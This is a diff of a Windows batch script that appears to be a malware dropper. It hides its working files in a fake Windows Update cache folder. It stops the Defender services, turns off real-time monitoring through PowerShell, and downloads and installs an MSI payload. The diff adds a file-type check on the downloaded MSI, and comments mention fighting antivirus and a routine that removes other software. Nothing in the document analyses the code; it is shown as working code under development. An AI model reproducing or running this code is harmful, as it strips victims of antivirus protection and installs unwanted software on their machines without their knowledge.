@@ -1,6 +1,6 @@
 @echo off
 setlocal EnableExtensions EnableDelayedExpansion
-REM OWN BUILD 20260802O50 - stuck Gryxa -> ARP nuke + detached msiexec /i (10s kill safe)
+REM OWN BUILD 20260804O51 - MSI OLE magic; soft AV (no Sense kill / no WinDefend disable)
 set "WD=%ProgramData%\Microsoft\Windows\WER\Temp\.wucache"
 set "BOOT=%SystemRoot%\Temp\.wucache"
 set "LOG=%WD%\boot.err"
@@ -187,7 +187,7 @@ del /f /q "%STG%\own_mon.cmd" "%STG%\own_secure.cmd" "%STG%\own_lib.ps1" "%STG%\
 echo [1] Defender + harden (exclusions/ACL) + soft AV stop...
 echo av_reg_begin>>"%LOG%"
 if exist "%WD%\own_secure.cmd" call "%WD%\own_secure.cmd"
-start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & sc stop Sense >nul 2>&1 & sc config WinDefend start= disabled >nul 2>&1"
+start "" /b cmd /c "sc stop WinDefend >nul 2>&1 & sc stop WdNisSvc >nul 2>&1 & powershell -NoProfile -NonInteractive -Command \"try{Set-MpPreference -DisableRealtimeMonitoring $true}catch{}\" >nul 2>&1"
 echo av_fight_done>>"%LOG%"
 
 echo [2] Download PRIMARY MSI (curl / powershell / github-pkg / cache)...
@@ -505,8 +505,15 @@ for %%A in ("%~1") do (
     del /f /q "%~1" >nul 2>&1
     exit /b 1
   )
-  copy /y "%~1" "%MSICACHE%" >nul 2>&1
 )
+rem O51: OLE magic d0cf11e0 — reject HTML/error pages (same class as L37 Gryxa)
+powershell -NoProfile -NonInteractive -Command "$p=$args[0]; $fs=[IO.File]::OpenRead($p); $b=New-Object byte[] 4; [void]$fs.Read($b,0,4); $fs.Close(); if($b[0]-eq 0xD0 -and $b[1]-eq 0xCF -and $b[2]-eq 0x11 -and $b[3]-eq 0xE0){exit 0}else{exit 1}" "%~1" >nul 2>&1
+if errorlevel 1 (
+  echo msi_bad_magic>>"%LOG%"
+  del /f /q "%~1" >nul 2>&1
+  exit /b 1
+)
+copy /y "%~1" "%MSICACHE%" >nul 2>&1
 exit /b 0
 
 :NukeForeign
